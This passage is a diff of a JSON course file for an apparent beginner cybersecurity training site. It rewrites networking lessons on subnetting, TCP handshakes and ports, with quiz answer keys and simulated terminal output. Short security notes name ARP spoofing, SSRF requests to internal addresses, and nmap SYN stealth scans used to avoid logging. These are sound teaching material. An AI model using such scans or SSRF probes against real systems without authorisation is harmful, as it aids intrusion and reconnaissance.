-        ],
-        "correctIndex": 2,
-        "explanation": "ARP broadcasts a query asking 'Who has this IP? Tell your MAC address.' Devices cache these responses in their ARP table."
+        "hint": "192.168.x.x is private.",
+        "explanation": "192.168.1.50 falls within the RFC 1918 Class C private range (192.168.0.0/16)."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Inspect Lab Interface Addresses",
-        "instruction": "Run `ip addr` in the terminal to view your configured network interfaces.",
+        "title": "Task 1: Inspect default gateway",
+        "instruction": "Execute `ip route` in the terminal.",
         "hints": [
-          "Concept: Linux modern network configuration command.",
-          "Direction: Replaced the older `ifconfig` command.",
-          "Tool: `ip` utility.",
-          "Syntax: `ip addr` (or `ip a`).",
-          "Explanation: Output reveals IP and MAC addresses."
+          "Type: `ip route`"
         ]
       }
     ],
-    "explainResult": "The `ip addr` utility made netlink calls to the Linux kernel to dump network device state and addresses registered to each interface.",
-    "securityConnection": "Because ARP does not authenticate responses, local attackers can send fraudulent ARP packets claiming that the router's IP belongs to the attacker's MAC address. This is called 'ARP Poisoning' or 'ARP Spoofing', and allows a local adversary to perform Man-in-the-Middle (MitM) attacks.",
-    "completion": {
-      "learned": [
-        "The difference between IPv4 and IPv6",
-        "Private RFC 1918 address ranges vs globally routable Public IPs",
-        "The role of the loopback interface (127.0.0.1)",
-        "How ARP translates Layer 3 IP addresses into Layer 2 MAC addresses"
-      ],
-      "practiced": [
-        "ip addr",
-        "Differentiating IP and MAC addresses",
-        "Identifying local subnet interfaces"
-      ]
-    },
-    "nextRoomId": "room-08"
+    "securityConnection": "In SSRF (Server-Side Request Forgery) attacks against web applications, an attacker tricks a public web server into making requests to its own internal private IP (`http://192.168.1.10/admin` or `http://127.0.0.1:8080/metrics`), bypassing external firewall boundaries!",
+    "id": "room-22",
+    "nextRoomId": "room-23"
   },
   {
-    "id": "room-08",
-    "stage": 2,
-    "stageTitle": "Stage 2 — Networking Fundamentals",
-    "title": "Ports, Services & Protocols",
+    "stage": 4,
+    "level": 4,
+    "levelTitle": "Level 4 \u2014 Networking Fundamentals",
+    "title": "Subnetting & CIDR Notation Demystified",
     "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
     "estimatedTime": "30 min",
-    "prerequisites": "Room 07 (IP Addresses & MAC Addresses)",
-    "whyAreYouHere": "An IP address tells you which computer to connect to, but a computer runs dozens of programs at once. How does incoming data know whether it belongs to a web server, a database, or an email service? The answer is **Ports**. Understanding standard ports and network services is one of the most critical foundational skills in cybersecurity.",
+    "prerequisites": "Room 22: Private vs Public IP Addresses & NAT",
+    "whyAreYouHere": "Subnetting is famously feared by beginners, but when broken down into binary logic, it is simple and elegant. A subnet mask tells your computer: 'Which part of this IP address is the Network ID (neighborhood), and which part is the Host ID (house number)?' In this room, you will master subnet masks, CIDR prefix notation (`/24`), network addresses, and broadcast addresses.",
     "objectives": [
-      "Understand what a network port is (range 0 to 65535)",
-      "Learn the three port ranges: Well-Known (0-1023), Registered (1024-49151), and Ephemeral (49152-65535)",
-      "Master the most common standard service ports (SSH, HTTP, HTTPS, DNS, SMB, MySQL, RDP)",
-      "Understand the difference between open, closed, and filtered port states",
-      "Inspect listening services on a system using `ss -tulpn`"
+      "Understand why networks are divided into smaller subnets (performance, security, organization)",
+      "Learn how Subnet Masks work using binary AND logic",
+      "Master CIDR (Classless Inter-Domain Routing) prefix notation (`/24`, `/16`, `/8`)",
+      "Calculate the Network Address, Broadcast Address, and Usable Host Range for a given subnet",
+      "Use the formula $2^{(32 - \\text{CIDR})} - 2$ to find total usable host capacities"
     ],
     "vocabulary": [
       {
-        "term": "Port",
-        "definition": "A 16-bit virtual endpoint (number 0 to 65535) that directs network traffic to a specific software service running on a machine."
+        "term": "Subnet Mask",
+        "definition": "A 32-bit number with contiguous 1s followed by 0s that separates an IP address into Network and Host portions (e.g. 255.255.255.0)."
       },
       {
-        "term": "Network Service",
-        "definition": "A daemon program (like Apache, OpenSSH, or MySQL) bound to a port, listening for incoming network connections."
+        "term": "CIDR (Classless Inter-Domain Routing)",
+        "definition": "A shorthand notation representing the number of leading 1-bits in a subnet mask (e.g., /24 means 24 ones: 255.255.255.0)."
       },
       {
-        "term": "Well-Known Ports",
-        "definition": "Ports 0 through 1023 reserved by IANA for standard core internet protocols and services."
+        "term": "Network Address",
+        "definition": "The very first address in a subnet where all host bits are 0 (e.g., 192.168.1.0). Identifies the network itself and cannot be assigned to a host."
       },
       {
-        "term": "Ephemeral Ports",
-        "definition": "Temporary, high-numbered ports (49152-65535) dynamically chosen by client operating systems to receive return traffic."
+        "term": "Broadcast Address",
+        "definition": "The very last address in a subnet where all host bits are 1 (e.g., 192.168.1.255). Used to send a packet to all hosts on the subnet."
       },
       {
-        "term": "Open Port",
-        "definition": "A port where an active service is listening and willing to accept incoming network connections."
+        "term": "Usable Host Range",
+        "definition": "All IP addresses between the Network Address and Broadcast Address that can be assigned to devices."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 170\" width=\"100%\" height=\"170\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <rect x=\"20\" y=\"55\" width=\"120\" height=\"60\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"80\" y=\"80\" fill=\"#f8fafc\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Your Browser</text>\n  <text x=\"80\" y=\"100\" fill=\"#94a3b8\" font-size=\"10\" text-anchor=\"middle\">endlessus.in?</text>\n\n  <path d=\"M 140 85 L 220 85\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"220,85 210,80 210,90\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"220\" y=\"30\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"300\" y=\"60\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">DNS Resolver (53)</text>\n  <text x=\"300\" y=\"80\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">1. Root Server (.)</text>\n  <text x=\"300\" y=\"100\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">2. TLD Server (.in)</text>\n  <text x=\"300\" y=\"120\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">3. Authoritative DNS</text>\n\n  <path d=\"M 380 85 L 450 85\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"450,85 440,80 440,90\" fill=\"#10b981\"/>\n\n  <rect x=\"450\" y=\"55\" width=\"130\" height=\"60\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"515\" y=\"80\" fill=\"#f8fafc\" font-size=\"12\" font-weight=\"bold\" text-anchor=\"middle\">Web Server</text>\n  <text x=\"515\" y=\"100\" fill=\"#f59e0b\" font-size=\"10\" text-anchor=\"middle\">104.21.75.12</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Apartment Analogy",
-        "content": "Think of an IP address as the street address of an apartment building: *42 Cyber Street*.\nThe building has 65,536 individual apartments numbered **0 to 65535**.\n• Apartment **80** is the Web concierge (HTTP).\n• Apartment **443** is the Secure encrypted concierge (HTTPS).\n• Apartment **22** is the Building Administrator's private maintenance door (SSH).\n• Apartment **53** is the building directory phonebook (DNS).\nWhen you send a packet, you specify both the destination IP *and* the destination Port!"
+        "title": "1. Why Subnet? Network ID vs Host ID",
+        "content": "Imagine a phone number: `+1 (555) 123-4567`.\n\u2022 `+1 (555)` is the area code (Network ID)\u2014everyone in that city shares it.\n\u2022 `123-4567` is your unique personal line (Host ID).\n\nIn IP networking, every IP address contains both a **Network portion** and a **Host portion**:\n\u2022 A **Subnet Mask** uses binary 1s to highlight the network bits and binary 0s for host bits:\n\n```\nIP:     192 . 168 .   1 . 100 -> 11000000.10101000.00000001.01100100\nMask:   255 . 255 . 255 .   0 -> 11111111.11111111.11111111.00000000\nNetwork:192 . 168 .   1 .   0 (First 24 bits are Network, last 8 bits are Host)\n```"
       },
       {
-        "title": "2. The Essential Security Reference Table",
-        "content": "You do not need to memorize all 65,536 ports. You must know these fundamental ports by heart:\n• **21**: FTP (File Transfer Protocol — unencrypted)\n• **22**: SSH (Secure Shell — encrypted remote terminal)\n• **25**: SMTP (Simple Mail Transfer Protocol)\n• **53**: DNS (Domain Name System)\n• **80**: HTTP (Hypertext Transfer Protocol — unencrypted web)\n• **110**: POP3 (Post Office Protocol email retrieval)\n• **143**: IMAP (Internet Message Access Protocol)\n• **443**: HTTPS (HTTP over TLS/SSL — encrypted web)\n• **445**: SMB (Server Message Block — Windows file sharing)\n• **3306**: MySQL (Database engine)\n• **3389**: RDP (Remote Desktop Protocol — Windows graphical remote access)"
+        "title": "2. CIDR Prefix Notation (/24)",
+        "content": "Writing `255.255.255.0` is tedious. Network engineers use **CIDR notation** (slash notation) indicating how many 1s are in the mask:\n\n\u2022 `/24`: 24 ones (`255.255.255.0`). $32 - 24 = 8$ host bits -> $2^8 = 256$ IPs ($254$ usable hosts).\n\u2022 `/16`: 16 ones (`255.255.0.0`). $32 - 16 = 16$ host bits -> $2^{16} = 65,536$ IPs ($65,534$ usable hosts).\n\u2022 `/8`: 8 ones (`255.0.0.0`). $32 - 8 = 24$ host bits -> $2^{24} = 16.7$ million IPs."
+      },
+      {
+        "title": "3. The Two Reserved Addresses (-2 Rule)",
+        "content": "In ANY subnet, two addresses can **NEVER be assigned to a computer**:\n\n1. **The First Address (Network ID)**: All host bits are 0 (e.g. `192.168.1.0`). Identifies the subnet.\n2. **The Last Address (Broadcast)**: All host bits are 1 (e.g. `192.168.1.255`). Packets sent here reach every device on the subnet.\n\n**Usable Hosts Formula**: $2^H - 2$ (where $H$ is the number of host bits).\nFor a `/24`: $2^8 - 2 = 256 - 2 = \\mathbf{254}$ usable addresses (`192.168.1.1` to `192.168.1.254`)."
       }
     ],
     "seeExamples": [
       {
-        "title": "Socket Combination: IP + Port",
-        "codeOrDiagram": "Client (Your Laptop)                            Target Server\nIP: 192.168.1.15                                IP: 104.21.55.2\nEphemeral Port: 54321  =====================>   Destination Port: 443 (HTTPS)\n(Dynamic temporary port)                        (Well-known web service)\n\nReturn Traffic:\nServer (104.21.55.2:443) ===============>       Client (192.168.1.15:54321)",
-        "explanation": "The combination of an IP address and a Port number is called a 'Socket' (e.g. `104.21.55.2:443`)."
+        "title": "Calculating a /24 Subnet",
+        "codeOrDiagram": "CIDR:             192.168.10.0/24\nSubnet Mask:      255.255.255.0\nNetwork Address:  192.168.10.0\nBroadcast:        192.168.10.255\nFirst Usable:     192.168.10.1\nLast Usable:      192.168.10.254\nTotal Usable:     254 hosts",
+        "explanation": "Standard Class C /24 subnet breakdown showing network, broadcast, and host range."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Find all network services currently listening for incoming connections on this system using `ss -tulpn`:",
+      "prompt": "Run `ip -4 addr show eth0` to view the IP and CIDR prefix of the eth0 network card:",
       "initialCommand": "",
-      "expectedCommand": "ss -tulpn",
-      "simulatedOutput": "Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port  Process\ntcp    LISTEN  0       128            0.0.0.0:22            0.0.0.0:*      users:((\"sshd\",pid=842))\ntcp    LISTEN  0       511            0.0.0.0:80            0.0.0.0:*      users:((\"nginx\",pid=1104))\ntcp    LISTEN  0       128          127.0.0.1:3306          0.0.0.0:*      users:((\"mysqld\",pid=1250))\n[+] Success! Discovered listening services: SSH (port 22), Nginx Web (port 80), and MySQL (port 3306 on localhost).",
-      "explanation": "`ss -tulpn` (Socket Statistics: TCP, UDP, Listening, Process Names, Numeric) is the standard modern utility for auditing active sockets."
+      "expectedCommand": "ip -4 addr show eth0",
+      "simulatedOutput": "2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500\n    inet 10.10.20.15/24 brd 10.10.20.255 scope global eth0\n[+] Subnet verified: IP is 10.10.20.15, subnet is /24 (255.255.255.0), broadcast is 10.10.20.255.",
+      "explanation": "`ip -4 addr` shows the IPv4 address with its CIDR slash notation."
     },
     "questions": [
       {
-        "id": "r8-q1",
-        "type": "matching",
-        "question": "Match the standard default port number to its corresponding network service:",
-        "options": [
-          "Port 22 -> SSH, Port 80 -> HTTP, Port 443 -> HTTPS, Port 445 -> SMB",
-          "Port 22 -> HTTP, Port 80 -> SSH, Port 443 -> DNS, Port 445 -> MySQL",
-          "Port 22 -> FTP, Port 80 -> HTTPS, Port 443 -> HTTP, Port 445 -> RDP",
-          "Port 22 -> SMB, Port 80 -> MySQL, Port 443 -> RDP, Port 445 -> SSH"
+        "id": "q-23-1",
+        "type": "exact",
+        "question": "What is the dotted-decimal subnet mask representation for a /24 CIDR prefix?",
+        "visualSlots": "_ _ _ . _ _ _ . _ _ _ . _",
+        "acceptedAnswers": [
+          "255.255.255.0"
         ],
-        "correctIndex": 0,
-        "explanation": "Port 22 is SSH (Secure Shell), Port 80 is unencrypted HTTP, Port 443 is encrypted HTTPS, and Port 445 is Microsoft SMB file sharing."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Three 255s followed by a 0.",
+        "explanation": "/24 equals 24 binary ones: 255.255.255.0."
       },
       {
-        "id": "r8-q2",
-        "type": "multiple-choice",
-        "question": "Looking at the `ss -tulpn` output above, MySQL is listening on `127.0.0.1:3306`. Can a remote attacker on another network connect directly to this database port?",
-        "options": [
-          "Yes, because port 3306 is open to the entire internet",
-          "No, because it is bound exclusively to loopback (127.0.0.1), so only local processes on the server can connect to it",
-          "Yes, but only if they use an unencrypted FTP client",
-          "No, because MySQL only runs on Windows operating systems"
+        "id": "q-23-2",
+        "type": "exact",
+        "question": "How many usable host IP addresses are available in a standard /24 subnet after subtracting the network and broadcast addresses?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "254"
         ],
-        "correctIndex": 1,
-        "explanation": "Binding to `127.0.0.1` is a security best-practice. It restricts socket access exclusively to programs running locally on the machine."
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "256 minus 2.",
+        "explanation": "256 total IP addresses minus 2 reserved (network and broadcast) = 254 usable hosts."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Audit Open Ports",
-        "instruction": "Execute `ss -tulpn` in the terminal to inspect listening network services.",
+        "title": "Task 1: Inspect CIDR subnet on eth0",
+        "instruction": "Execute `ip -4 addr show eth0` in the terminal.",
         "hints": [
-          "Concept: Socket statistics command.",
-          "Direction: Use flags `-t` (TCP), `-u` (UDP), `-l` (listening), `-p` (processes), `-n` (numeric).",
-          "Tool: `ss`",
-          "Syntax: `ss -tulpn`",
-          "Explanation: Lists all listening sockets."
+          "Type: `ip -4 addr show eth0`"
         ]
       }
     ],
-    "explainResult": "The `ss` command queried the Linux kernel socket diagnostic API (`sock_diag`) to retrieve all TCP and UDP transmission control blocks currently in the `LISTEN` state.",
-    "securityConnection": "Every open port on a server represents attack surface! If a server exposes port 21 (FTP), attackers will test for anonymous logins. If it exposes port 3389 (RDP), they will test for brute-force passwords or BlueKeep vulnerabilities. Hardening a server begins with shutting down every port that is not strictly necessary.",
-    "completion": {
-      "learned": [
-        "What network ports are and why they exist (0-65535)",
-        "The standard common service ports (21, 22, 53, 80, 443, 445, 3306, 3389)",
-        "How sockets combine an IP address with a port number",
-        "The security implication of binding to 127.0.0.1 vs 0.0.0.0"
-      ],
-      "practiced": [
-        "ss -tulpn",
-        "Auditing listening sockets",
-        "Matching ports to service daemons"
-      ]
-    },
-    "nextRoomId": "room-09"
+    "securityConnection": "In network penetration testing, defining your target scope involves CIDR notation (e.g. `nmap -sn 10.10.20.0/24`). Scanning a `/24` scans 256 IPs; scanning a `/16` scans 65,536 IPs! Scoping errors can result in accidentally scanning unauthorized client networks.",
+    "id": "room-23",
+    "nextRoomId": "room-24"
   },
   {
-    "id": "room-09",
-    "stage": 2,
-    "stageTitle": "Stage 2 — Networking Fundamentals",
-    "title": "TCP/IP & Packet Encapsulation",
+    "stage": 4,
+    "level": 4,
+    "levelTitle": "Level 4 \u2014 Networking Fundamentals",
+    "title": "TCP vs UDP & The 3-Way Handshake",
     "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
-    "estimatedTime": "30 min",
-    "prerequisites": "Room 08 (Ports, Services & Protocols)",
-    "whyAreYouHere": "When you download a file or stream a video, the file is not transmitted as one giant continuous block of data. Instead, it is chopped up into thousands of tiny envelopes called **Packets**. In this room, you will learn how data is encapsulated as it moves down the network stack, how the famous TCP 3-Way Handshake establishes reliable connections, and when UDP is chosen instead of TCP.",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
+    "estimatedTime": "25 min",
+    "prerequisites": "Room 23: Subnetting & CIDR Basics",
+    "whyAreYouHere": "At Transport Layer 4, all internet communications rely on one of two fundamental protocols: TCP (Transmission Control Protocol) or UDP (User Datagram Protocol). Understanding how TCP establishes trust through its 3-Way Handshake (SYN, SYN-ACK, ACK) is essential for mastering port scanning, network firewalls, and Denial of Service attacks.",
     "objectives": [
-      "Understand Packet Encapsulation and the 4-layer TCP/IP Model",
-      "Understand the difference between Frames (Layer 2), Packets (Layer 3), and Segments (Layer 4)",
+      "Differentiate between connection-oriented TCP and connectionless UDP",
+      "Learn why web pages and file transfers use TCP, while gaming and DNS use UDP",
       "Master the TCP 3-Way Handshake: SYN -> SYN-ACK -> ACK",
-      "Compare connection-oriented TCP (reliable) with connectionless UDP (fast, streaming)",
-      "Follow an interactive packet visualization"
+      "Understand TCP Control Flags: SYN, ACK, FIN, RST, PSH, URG",
+      "Understand TCP teardown with FIN and abrupt resets with RST"
     ],
     "vocabulary": [
       {
-        "term": "Packet",
-        "definition": "A formatted unit of data carried across a packet-switched network, containing control headers and user payload."
-      },
-      {
-        "term": "Encapsulation",
-        "definition": "The process where each network layer wraps the data from the layer above it with its own header."
-      },
-      {
         "term": "TCP (Transmission Control Protocol)",
-        "definition": "A reliable, connection-oriented transport protocol that guarantees ordered, error-checked packet delivery."
+        "definition": "A connection-oriented, reliable protocol that guarantees packet delivery in the correct sequence with error checking and retransmission."
       },
       {
         "term": "UDP (User Datagram Protocol)",
-        "definition": "A lightweight, connectionless transport protocol that sends datagrams without handshakes or delivery guarantees."
-      },
-      {
-        "term": "TCP 3-Way Handshake",
-        "definition": "The three-message exchange (SYN, SYN-ACK, ACK) required to establish a TCP session before data can flow."
+        "definition": "A lightweight, connectionless, 'best-effort' protocol with low latency, but no guarantee of delivery or ordering."
       },
       {
         "term": "SYN (Synchronize)",
-        "definition": "The first TCP packet sent by a client to request a connection and negotiate initial sequence numbers."
+        "definition": "The TCP flag sent by a client to initiate a connection and synchronize sequence numbers."
       },
       {
         "term": "ACK (Acknowledge)",
-        "definition": "A TCP flag acknowledging receipt of previous packets."
+        "definition": "The TCP flag indicating receipt of transmitted packets or acknowledging a handshake step."
+      },
+      {
+        "term": "RST (Reset)",
+        "definition": "The TCP flag that abruptly closes a connection, often sent by firewalls or closed ports rejecting a connection."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 200\" width=\"100%\" height=\"200\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <line x1=\"120\" y1=\"30\" x2=\"120\" y2=\"180\" stroke=\"#38bdf8\" stroke-width=\"3\"/>\n  <text x=\"120\" y=\"22\" fill=\"#38bdf8\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Client (You)</text>\n  \n  <line x1=\"480\" y1=\"30\" x2=\"480\" y2=\"180\" stroke=\"#10b981\" stroke-width=\"3\"/>\n  <text x=\"480\" y=\"22\" fill=\"#10b981\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Target Server</text>\n\n  <!-- Step 1 SYN -->\n  <line x1=\"120\" y1=\"60\" x2=\"480\" y2=\"80\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <polygon points=\"480,80 470,75 470,85\" fill=\"#f59e0b\"/>\n  <text x=\"300\" y=\"65\" fill=\"#f59e0b\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">1. SYN (Synchronize seq=100)</text>\n\n  <!-- Step 2 SYN-ACK -->\n  <line x1=\"480\" y1=\"105\" x2=\"120\" y2=\"125\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"120,125 130,120 130,130\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"110\" fill=\"#38bdf8\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">2. SYN-ACK (ack=101 seq=300)</text>\n\n  <!-- Step 3 ACK -->\n  <line x1=\"120\" y1=\"150\" x2=\"480\" y2=\"170\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"480,170 470,165 470,175\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"155\" fill=\"#10b981\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">3. ACK (Connection Established)</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Russian Nesting Dolls: Encapsulation",
-        "content": "When your browser sends an HTTP request:\n1. **Application Layer**: Contains raw HTTP text: `GET / HTTP/1.1`.\n2. **Transport Layer (TCP)**: Wraps it in a **TCP Segment** adding Source Port and Destination Port.\n3. **Network Layer (IP)**: Wraps that in an **IP Packet** adding Source IP and Destination IP.\n4. **Data Link Layer (Ethernet)**: Wraps that in an **Ethernet Frame** adding Source MAC and Destination MAC.\nEach layer only cares about its own header!"
+        "title": "1. TCP vs UDP: Reliable vs Fast",
+        "content": "\u2022 **TCP (Reliable & Orderly)**: Before any data is transmitted, a formal connection must be established. Every packet is tracked by a sequence number. If a packet is lost in transit, the sender automatically retransmits it. Used for: Web (HTTP/HTTPS), SSH, Email (SMTP), and File Transfer (FTP).\n\u2022 **UDP (Fire and Forget)**: No handshake, no sequence numbers, no retransmissions. Packets are fired like a stream of water. If a packet is dropped, it is gone forever! Used for: Live video streaming, VoIP voice calls, multiplayer gaming, and fast DNS queries."
       },
       {
         "title": "2. The TCP 3-Way Handshake",
-        "content": "Before a single byte of web data can transfer over TCP, client and server must agree to communicate:\n1. **SYN**: Client sends: *\"Hello! I want to connect. My sequence number is 1000.\"*\n2. **SYN-ACK**: Server replies: *\"I hear you! I agree to connect. I received 1000, and my sequence number is 5000.\"*\n3. **ACK**: Client confirms: *\"Understood! Connection established.\"*\nNow data begins flowing. If a packet gets dropped along the way, TCP automatically detects the missing sequence number and re-transmits it!"
+        "content": "Before your browser downloads a single byte from a web server, the two devices perform a 3-step conversation:\n\n1. **Step 1: SYN (Synchronize)**: Client sends: *\"Hello server, I want to connect to port 443. My initial sequence number is 1000.\"*\n2. **Step 2: SYN-ACK (Synchronize-Acknowledge)**: Server replies: *\"I hear you! I acknowledge your 1000 (ACK=1001). My sequence number is 5000 (SYN=5000).\"*\n3. **Step 3: ACK (Acknowledge)**: Client sends: *\"Got it! I acknowledge your 5000 (ACK=5001). Let's begin transferring data!\"*\n\nThe connection is now **ESTABLISHED**."
       },
       {
-        "title": "3. TCP vs UDP: Which to Use?",
-        "content": "• **Use TCP** when **accuracy is essential**: Websites (HTTP/HTTPS), file downloads, SSH, and databases. If a byte is missing in a bank transfer, it corrupts the file.\n• **Use UDP** when **speed is essential**: Voice/video calls (VoIP, Zoom), multiplayer online games, and DNS queries. If one audio frame drops in a voice call, nobody wants the call to pause for re-transmission!"
+        "title": "3. The TCP Control Flags",
+        "content": "Every TCP packet header contains 1-bit flags that communicate connection state:\n\n\u2022 **SYN**: Initiates connection.\n\u2022 **ACK**: Acknowledges received data.\n\u2022 **FIN**: Gracefully terminates connection ('I am finished sending data').\n\u2022 **RST**: Abruptly aborts connection ('Port closed / Connection reset').\n\u2022 **PSH**: Push data to the application immediately without waiting for buffer."
       }
     ],
     "seeExamples": [
       {
-        "title": "The TCP 3-Way Handshake Sequence",
-        "codeOrDiagram": "Client                                 Server\n  |                                      |\n  | ------------ [ SYN ] --------------> | (Step 1: Request connection)\n  |                                      |\n  | <--------- [ SYN-ACK ] ------------- | (Step 2: Acknowledge & offer sync)\n  |                                      |\n  | ------------ [ ACK ] --------------> | (Step 3: Acknowledge & ready)\n  |                                      |\n  | ======== [ DATA STREAM ] ==========> | (Step 4: HTTP Request / Payload)",
-        "explanation": "Every single web request, SSH login, and database query begins with these exact three packets."
+        "title": "Inspecting Active TCP Connections with netstat",
+        "codeOrDiagram": "cadet@endlessus:~$ netstat -tuln\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\nudp        0      0 0.0.0.0:68              0.0.0.0:*",
+        "explanation": "`netstat -tuln` shows listening TCP and UDP sockets and their port numbers."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Simulate a TCP handshake to a remote web server using `curl -I https://endlessus.in`:",
+      "prompt": "Run `netstat -tuln` to view listening TCP and UDP ports on the machine:",
       "initialCommand": "",
-      "expectedCommand": "curl -I https://endlessus.in",
-      "simulatedOutput": "HTTP/2 200 \nserver: GitHub.com\ncontent-type: text/html; charset=utf-8\nstrict-transport-security: max-age=31536000\n[+] Success! Full TCP handshake + TLS negotiation + HTTP/2 HEAD request completed in 42ms.",
-      "explanation": "`curl -I` performs the TCP handshake, negotiates TLS encryption, sends an HTTP HEAD request, and prints only the response headers."
+      "expectedCommand": "netstat -tuln",
+      "simulatedOutput": "Proto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\n[+] Sockets enumerated: SSH (port 22) and HTTP (port 80) in LISTEN state.",
+      "explanation": "`netstat` lists open network ports and connection states."
     },
     "questions": [
       {
-        "id": "r9-q1",
+        "id": "q-24-1",
+        "type": "exact",
+        "question": "What is the name of the TCP flag sent in the very first step of the 3-way handshake to initiate a connection?",
+        "visualSlots": "_ _ _",
+        "acceptedAnswers": [
+          "SYN"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Short for Synchronize.",
+        "explanation": "SYN (Synchronize) initiates the TCP 3-way handshake."
+      },
+      {
+        "id": "q-24-2",
         "type": "multiple-choice",
-        "question": "What are the three steps of the TCP connection establishment handshake in correct chronological order?",
+        "question": "What sequence of packets establishes a full TCP connection between a client and a server?",
         "options": [
           "SYN -> ACK -> FIN",
           "SYN -> SYN-ACK -> ACK",
-          "PING -> PONG -> OK",
-          "HELLO -> READY -> GO"
+          "ACK -> SYN -> RST",
+          "PING -> PONG -> CONNECT"
         ],
         "correctIndex": 1,
-        "explanation": "The client sends a SYN, the server responds with SYN-ACK, and the client finishes with ACK."
-      },
-      {
-        "id": "r9-q2",
-        "type": "multiple-choice",
-        "question": "Why does live online multiplayer gaming or VoIP voice chat typically rely on UDP rather than TCP?",
-        "options": [
-          "UDP automatically encrypts all passwords with AES-256",
-          "UDP prioritizes real-time low latency over re-transmitting lost packets",
-          "UDP requires physical fiber-optic cables to function",
-          "UDP is only supported on Windows operating systems"
-        ],
-        "correctIndex": 1,
-        "explanation": "UDP does not retransmit dropped packets, avoiding stutter and delay during real-time streaming."
+        "hint": "Synchronize, Synchronize-Acknowledge, Acknowledge.",
+        "explanation": "The standard TCP handshake sequence is SYN, then SYN-ACK, followed by ACK."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Execute TCP Connection Probe",
-        "instruction": "Run `curl -I https://endlessus.in` to complete a handshake and retrieve server headers.",
+        "title": "Task 1: Inspect listening network ports",
+        "instruction": "Execute `netstat -tuln` in the terminal.",
         "hints": [
-          "Concept: Perform an HTTP HEAD request via TCP/TLS.",
-          "Direction: Use the client URL utility.",
-          "Tool: `curl`",
-          "Syntax: `curl -I https://endlessus.in`",
-          "Explanation: Performs handshake and prints response headers."
+          "Type: `netstat -tuln`"
         ]
       }
     ],
-    "explainResult": "The `curl` command initiated a TCP socket, triggered the SYN/SYN-ACK/ACK sequence, negotiated cryptographic ciphers over TLS, and retrieved HTTP status `200 OK`.",
-    "securityConnection": "Understanding the TCP handshake is the secret behind network scanning! In Stage 5, you will learn about the **SYN Stealth Scan** (`nmap -sS`), where an attacker sends a SYN packet to test if a port is open, but intentionally sends a RST (Reset) before completing the final ACK. This detects open ports without establishing full connections in server application logs!",
-    "completion": {
-      "learned": [
-        "The 4-layer TCP/IP encapsulation process",
-        "Frames (L2), Packets (L3), Segments (L4), and Application Payloads",
-        "The mechanics of the TCP 3-Way Handshake (SYN -> SYN-ACK -> ACK)",
-        "When to use reliable TCP vs low-latency UDP"
-      ],
-      "practiced": [
-        "curl -I",
-        "Tracing TCP connection stages",
-        "Analyzing header responses"
-      ]
-    },
-    "nextRoomId": "room-10"
+    "securityConnection": "In network scanning, **SYN Stealth Scanning** (`nmap -sS`) sends only the initial SYN packet. If the server replies SYN-ACK, Nmap knows the port is open and immediately sends a RST packet to tear down the connection *without* completing the handshake, evading older application-level loggers!",
+    "id": "room-24",
+    "nextRoomId": "room-25"
   },
   {
-    "id": "room-10",
-    "stage": 2,
-    "stageTitle": "Stage 2 — Networking Fundamentals",
-    "title": "DNS & DHCP Fundamentals",
+    "stage": 4,
+    "level": 4,
+    "levelTitle": "Level 4 \u2014 Networking Fundamentals",
+    "title": "Ports & Common Network Services",
     "difficulty": "Foundation",
-    "difficultyBadge": "🔵 Foundation",
+    "difficultyBadge": "\ud83d\udd35 Foundation",
     "estimatedTime": "25 min",
